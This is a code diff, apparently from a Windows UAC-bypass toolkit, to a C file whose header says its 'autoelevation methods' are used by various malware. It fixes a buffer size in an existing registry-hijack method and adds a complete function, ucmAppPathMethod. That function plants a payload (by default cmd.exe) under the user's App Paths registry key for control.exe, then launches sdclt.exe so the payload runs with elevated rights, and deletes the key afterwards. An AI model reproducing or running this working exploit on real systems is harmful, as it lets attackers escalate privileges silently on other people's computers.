@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     2.57
+*  VERSION:     2.59
 *
-*  DATE:        07 Feb 2017
+*  DATE:        15 Mar 2017
 *
 *  Enigma0x3 autoelevation methods.
 *  Used by various malware.
@@ -14,6 +14,7 @@
 *  For description please visit original URL
 *  https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
 *  https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/
+*  https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -53,7 +54,7 @@ BOOL ucmHijackShellCommandMethod(
             sz = 0x1000;
         }
         else {
-            sz = _strlen(lpszPayload);
+            sz = _strlen(lpszPayload) * sizeof(WCHAR);
         }
         lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
         if (lpBuffer == NULL)
@@ -270,5 +271,126 @@ BOOL ucmDiskCleanupRaceCondition(
             bResult = TRUE;
         CloseHandle(hThread);
     }
+    return bResult;
+}
+
+/*
+* ucmAppPathMethod
+*
+* Purpose:
+*
+* Give target application our payload to execute because we can control App Path key data.
+*
+* E.g. 
+* lpszPayload = your.exe
+* lpszAppPathTarget = control.exe
+* lpszTargetApp = sdclt.exe
+*
+* Create key HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\<lpszAppPathTarget>
+* Set default key value to <lpszPayload>
+* Run <lpszTargetApp>
+*
+*/
+BOOL ucmAppPathMethod(
+    _In_opt_ LPWSTR lpszPayload,
+    _In_ LPWSTR lpszAppPathTarget,
+    _In_ LPWSTR lpszTargetApp
+)
+{
+    BOOL    bResult = FALSE, bCond = FALSE;
+    LRESULT lResult;
+    HKEY    hKey = NULL;
+    LPWSTR  lpKeyPath = NULL, lpBuffer = NULL;
+    SIZE_T  sz;
+    WCHAR   szBuffer[MAX_PATH * 2];
+
+#ifndef _WIN64
+    PVOID   OldValue = NULL;
+#endif
+
+    if ((lpszTargetApp == NULL) || (lpszAppPathTarget == NULL))
+        return FALSE;
+
+    //
+    // If under Wow64 disable redirection.
+    // Some target applications may not exists in wow64 folder.
+    //
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        if (!NT_SUCCESS(RtlWow64EnableFsRedirectionEx((PVOID)TRUE, &OldValue)))
+            return FALSE;
+    }
+#endif
+
+    do {
+
+        sz = 0;
+        if (lpszPayload == NULL) {
+            sz = 0x1000;
+        }
+        else {
+            sz = _strlen(lpszPayload) * sizeof(WCHAR);
+        }
+        lpBuffer = RtlAllocateHeap(g_ctx.Peb->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        if (lpBuffer == NULL)
+            break;
+
+        if (lpszPayload != NULL) {
+            _strcpy(lpBuffer, lpszPayload);
+        }
+        else {
+            //no payload specified, use default cmd.exe
+            RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
+            supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+            _strcpy(lpBuffer, szBuffer);
+        }
+
+        sz = (1 + _strlen(lpszAppPathTarget)) * sizeof(WCHAR) + sizeof(T_APP_PATH);
+        lpKeyPath = RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sz);
+        if (lpKeyPath == NULL)
+            break;
+
+        // 
+        // Create App Path key for our target app.
+        //
+        _strcpy(lpKeyPath, T_APP_PATH);
+        _strcat(lpKeyPath, lpszAppPathTarget);
+        lResult = RegCreateKeyEx(HKEY_CURRENT_USER,
+            lpKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, MAXIMUM_ALLOWED, NULL, &hKey, NULL);
+
+        //
+        // Set default value as our payload executable.
+        //
+        if (lResult == ERROR_SUCCESS) {
+            lResult = RegSetValueEx(hKey, L"", 0, REG_SZ, (BYTE*)lpBuffer,
+                (DWORD)(_strlen(lpBuffer) * sizeof(WCHAR)));
+
+            //
+            // Finally run target app.
+            //
+            if (lResult == ERROR_SUCCESS)
+                bResult = supRunProcess(lpszTargetApp, NULL);
+
+            RegCloseKey(hKey);
+            RegDeleteKey(HKEY_CURRENT_USER, lpKeyPath);
+        }
+
+    } while (bCond);
+
+    if (lpKeyPath != NULL)
+        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpKeyPath);
+
+    if (lpBuffer != NULL)
+        RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, lpBuffer);
+
+    //
+    // Reenable wow64 redirection if under wow64.
+    //
+#ifndef _WIN64
+    if (g_ctx.IsWow64) {
+        RtlWow64EnableFsRedirectionEx(OldValue, &OldValue);
+    }
+#endif
+
     return bResult;
 }
